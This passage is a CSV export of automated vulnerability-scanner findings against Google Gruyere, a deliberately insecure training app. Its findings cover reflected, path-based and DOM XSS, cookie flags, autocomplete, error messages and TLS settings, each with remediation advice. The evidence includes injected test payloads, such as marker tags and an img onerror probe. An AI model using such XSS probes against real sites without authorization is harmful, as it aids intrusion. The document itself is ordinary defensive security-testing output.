Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"9c672e03-5cf4-4be9-813f-c55c89ff6e83",2022-03-15T18:42:41.743Z,2022-03-15T17:25:38Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"9dc73657-00c2-443f-8baf-be352f5869af",2022-03-15T18:42:41.743Z,2022-03-15T16:59:55Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP PUT request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"a1258a21-3829-4800-ac71-8c9126fd3fc8",2022-03-15T21:06:17.432Z,2022-03-15T15:34:35Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/newaccount.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"a369391a-cb6a-4249-a967-7d91eec0be4d",2022-03-15T21:06:17.432Z,2022-03-15T14:01:09Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"a3de35e4-a2d3-463d-8b87-a08667f2b983",2022-03-15T21:06:17.432Z,2022-03-15T19:58:11Z,"On https://google-gruyere.appspot.com/656501648683287335357107855369111942818/newaccount.gtl debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The remote server is configured with a SSL/TLS cipher suite preference list used to determine the cipher suite during the negotiation with the client.",SSL/TLS,112598,"SSL/TLS Server Cipher Suite Preference",,2020-09-24T00:00:00Z,2020-09-24T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://wiki.mozilla.org/Security/Server_Side_TLS, http://www.exploresecurity.com/testing-for-cipher-suite-preference/",Info,,,"a4a2ce04-3af7-4312-83d0-392810b4602a",2022-03-15T18:42:41.743Z,2022-03-15T16:46:11Z,"The scanner detected that the remote host is configured with cipher suite preference on the following protocol(s): 

TLS v1.1
-------
TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
TLS_RSA_WITH_AES_128_CBC_SHA
TLS_RSA_WITH_AES_256_CBC_SHA
TLS_RSA_WITH_3DES_EDE_CBC_SHA

TLS v1.0
-------
TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
TLS_RSA_WITH_AES_128_CBC_SHA
TLS_RSA_WITH_AES_256_CBC_SHA
TLS_RSA_WITH_3DES_EDE_CBC_SHA

",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"a647a88a-533c-4ecd-81ad-406db4977e5f",2022-03-15T21:06:17.432Z,2022-03-15T14:28:49Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"a65581ad-c289-401b-9cda-86c6d6bcaa6f",2022-03-15T18:42:41.743Z,2022-03-15T18:04:47Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP POST request made on the URL 'https://google-gruyere.appspot.com/code/index.php?s=captcha'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"a75e7ec6-a548-40d5-9b99-357f4f6e7975",2022-03-15T21:06:17.432Z,2022-03-15T17:46:50Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/563265819128830739647592760263700851280/login"">
  <input type=""text"" name=""uid"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""submit"" value=""Login"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"a80bcf75-54b2-4df4-ac29-8535313fb790",2022-03-15T21:06:17.432Z,2022-03-15T15:01:18Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.5,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N","HTTPS is enabled on the website however HTTP requests are not redirected to HTTPS. Communications are not encrypted if users doesn't explicitly access to HTTPS version of the website.",SSL/TLS,112544,"HTTP to HTTPS Redirect Not Enabled",,2019-02-12T00:00:00Z,2021-10-27T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[818], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet",Medium,"Enable HTTP to HTTPS redirect for all requests. Besides redirects if HTTP Strict Transport Security (HSTS) is not implemented it's highly recommended to enable it.",,"aa3c1a74-704b-4c03-9b52-809d4ad42fba",2022-03-15T18:42:41.743Z,2022-03-15T16:45:57Z,"The Scanner was unable to detect a HTTPS redirect on URL: http://google-gruyere.appspot.com/361357029172560933265350706939995878846/",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"ab3a479f-3509-4a47-bf1f-6aba49d5d5d9",2022-03-15T21:06:17.432Z,2022-03-15T13:37:01Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom html tag.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The design of many web applications require that users be able to upload files that will either be stored or processed by the receiving web server.

Scanner has flagged this not as a vulnerability, but as a prompt for the penetration tester to conduct further manual testing on the file upload function.

An insecure form-based file upload could allow a cyber-criminal a means to abuse and successfully exploit the server directly, and/or any third party that may later access the file. This can occur through uploading a file containing server side-code (such as PHP) that is then executed when requested by the client.","Web Applications",98080,"Form-based File Upload",,2017-03-31T00:00:00Z,2017-10-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Unrestricted_File_Upload",Info,"The identified page should at a minimum:
1. Whitelist permitted file types and block all others. This should be conducted on the MIME type of the file rather than its extension. 2. As the file is uploaded, and prior to being handled (written to the disk) by the server, the filename should be stripped of all control, special, or Unicode characters. 3. Ensure that the upload is conducted via the HTTP `POST` method rather than `GET` or `PUT`. 4. Ensure that the file is written to a directory that does not hold any execute permission and that all files within that directory inherit the same permissions. 5. Scan (if possible) with an up-to-date virus scanner before being stored. 6. Ensure that the application handles files as per the host operating system. For example, the length of the file name is appropriate, there is adequate space to store the file, protection against overwriting other files etc.",,"ab6d0fa8-fd50-405a-a997-35502d3dcdfc",2022-03-15T18:42:41.743Z,2022-03-15T17:31:06Z,"The scanner detected the presence of a file upload functionnality in a form returned by the target application.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","SameSite is an attribute which can be set on a cookie to instruct the web browser if this cookie can be sent along with cross-site requests to help prevent Cross-Site Request Forgery (CSRF) attacks.

The attribute has three possible values :

 - Strict : the cookie will only be sent in a first-party context, thus preventing cross-site requests initiated from third-party websites to include it.

 - Lax : the cookie is allowed to be sent in GET cross-site requests initiated by the top-level navigation from third-party websites. For example, following an hypertext link from the external website will make the request include the cookie.

 - None : the cookie is explicitly set to be sent by the browser in any context.

The scanner identified the lack of SameSite attribute on cookies set by the application or a misconfiguration.","Web Applications",115540,"Cookie Without SameSite Flag Detected",,2018-12-14T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A5], owasp_2013=[A8], owasp_2017=[], owasp_2021=[A1], cwe=[352], cve=[], cpe=[], wasc=[Cross-Site Request Forgery], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite, https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute, https://web.dev/samesite-cookies-explained, https://blog.chromium.org/2019/10/developers-get-ready-for-new.html",Low,"Web browsers default behavior may differ when processing cookies in a cross-site context, making the final decision to send the cookie in this context unpredictable. The SameSite attribute should be set in every cookie to enforce the expected result by developers. When using the 'None' attribute value, ensure that the cookie is also set with the 'Secure' flag.",,"b0922f08-ea48-4a7d-b9b6-66c3ed9129c6",2022-03-15T21:06:17.432Z,2022-03-15T16:41:46Z,"The scanner detected a cookie named 'GRUYERE' which does not have the 'SameSite' attribute set.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"b0dd9a69-ebbe-4d82-b258-6d6b44474c68",2022-03-15T21:06:17.432Z,2022-03-15T15:30:31Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/563265819128830739647592760263700851280/login with input fields : 
- uid (text)
- pw (password)

This form is submitted by using the following action : http://google-gruyere.appspot.com/563265819128830739647592760263700851280/login",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"b163427e-a7a6-45ed-acfb-a9c51dd5326f",2022-03-15T21:06:17.432Z,2022-03-15T13:36:01Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"b1980d73-a189-4c78-8dfe-4dfabf8d7bcf",2022-03-15T21:06:17.432Z,2022-03-15T19:28:52Z,"On https://google-gruyere.appspot.com/563265819128830739647592760263700851280/editprofile.gtl debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

